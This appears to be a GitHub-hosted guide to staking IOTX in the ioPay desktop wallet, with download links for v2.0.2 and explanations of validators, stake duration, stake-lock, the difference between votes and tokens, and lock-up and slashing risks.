![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# How to Stake IOTX in ioPay Wallet

Staking IOTX means delegating tokens to an IoTeX validator and locking them for a duration you choose. In ioPay Wallet it is four decisions - **validator, amount, duration, stake-lock** - and one confirmation.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

Before the steps, the parameters, because they constrain every decision:

| Parameter | Value |
|---|---|
| Minimum stake | **100 IOTX** |
| Maximum duration | **1050 days** |
| Duration steps | **7 days** |
| Position name | a **bucket** |
| Early exit | requires **stake-lock off**, then the unstaking countdown |

## Where staking happens

IoTeX staking is on-chain. Anywhere that can sign an IoTeX staking transaction can stake, which is why "where can I stake IOTX" has more than one right answer: the staking route IoTeX documents, a validator's own interface, and a wallet like this one. What differs is the interface and the amount of information it puts in front of you before you sign.

This guide uses ioPay Wallet v2.0.2, the current desktop release, because it shows the three numbers that matter - **APY, uptime and commission** - per validator, plus a reward calculator before you commit.

## Stake, step by step

**1. Open the staking section** and start a new stake.

**2. Choose a validator.** You are delegating your weight to one. Compare on APY, uptime and commission rather than picking the first name in the list, and consider splitting across more than one. [Choosing a validator](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/best-iotex-validator-for-iopay-staking.md) is its own decision and gets its own page.

**3. Enter the amount.** At least **100 IOTX**. Leave some IOTX unstaked for gas - staking everything leaves you unable to pay for the transactions that manage the position.

**4. Choose a duration.** Up to **1050 days**, in **7-day increments**. Longer durations are a commitment, not a bonus rate you can walk away from.

**5. Decide stake-lock.** Stake-lock is the switch that decides whether the bucket can be withdrawn early. Leave it on and the stake is committed for the duration; turn it off and the unstaking countdown can start.

**6. Confirm and sign.** If you use a Ledger or Trezor, confirm on the device.

**7. Check the bucket appears.** One position, one bucket, with its own ID, duration and validator. If you compound rewards later, that may create a second bucket - [compounding](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-compound-iotx-rewards-in-iopay.md) explains why.

## The vote question, in full

This is the most-repeated confusion in every IoTeX staking thread, so it gets its own section:

**Votes are governance weight. They are not tokens.**

A stake of **70,000 IOTX can display around 92,000 votes**. That number is your weight in validator selection and governance, produced by the chain's vote-power mechanics - it is not a balance, not a bonus, and not what you get back.

When you withdraw:

- you receive **the staked amount plus accrued rewards**;
- you do **not** receive the vote number;
- the gap between the two is not value you lost, and the vote number is not value you gained.

If a wallet, a calculator or a forum post tells you that a 70k stake "becomes" 92k, it is confusing the two figures. [Staking rewards troubleshooting](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-rewards-not-showing-up.md) starts from the same point, because reading votes as tokens is also the most common reason people think rewards are missing.

## The two risks, stated plainly

**Lock-up.** Staked tokens are not spendable. Exiting is a sequence rather than a button, and it takes days, not minutes - [the unstaking page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md) has the steps and the timing.

**Slashing.** Delegated proof of stake can penalise stake attached to a validator that misbehaves. Spreading stake across more than one validator reduces concentration, and it is the main reason not to put everything on a single operator.

Staking does not destroy your tokens. It locks them and exposes them to those two risks, and any page that leaves that out is selling rather than explaining.

## What staking does not guarantee

**No fixed return.** The rate depends on the chain's reward schedule and your validator's commission and performance. [The APY and calculator page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iopay-staking-apy-calculator-guide.md) explains how to project earnings without pretending a number is permanent.

**No guaranteed validator performance.** Uptime is a historical measure, not a promise.

**No instant exit.** The wait starts when stake-lock goes off, and it is measured in days ([how long](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/iotex-unstaking-period-explained-for-iopay-users.md)).

## FAQ

**How do I stake IOTX?**
Pick a validator, stake at least 100 IOTX for a duration of up to 1050 days in 7-day steps, choose stake-lock, and confirm. The position becomes a bucket.

**Where can you do IoTeX staking?**
On-chain, through any interface that signs IoTeX staking transactions - the staking route IoTeX documents, a validator's interface, or a wallet such as ioPay Wallet.

**I staked 70k IOTX but it shows 92k votes - will I get 92k back?**
No. Votes are governance weight, not tokens. You get back the staked amount plus rewards. The 92k figure is your weight, and it is not a balance.

**Can I add to an existing stake?**
You can stake again, or compound rewards into the position. Either can produce a separate bucket rather than growing the original, so check the bucket list afterwards.

**Is there a minimum duration?**
Durations run in 7-day increments up to 1050 days. The minimum stake is 100 IOTX.

## The day after staking

The bucket is the evidence. Check that it exists, that the validator name matches the one you chose, and that the amount and duration are what you entered; a stake that landed on a different validator is still a stake, just not the one you decided on.

Spendable IOTX should have fallen by the amount plus the fee. Rewards do not arrive with the delegation - the staking dashboard is where they accumulate - so an empty rewards figure on day one is not a fault. Leave enough unstaked to pay for the next transaction, including the claim you will eventually want to make.

---

*Parameters follow IoTeX staking documentation: 100 IOTX minimum, 1050-day maximum, 7-day increments, bucket/stake-lock mechanics. No APY is quoted here by design.*
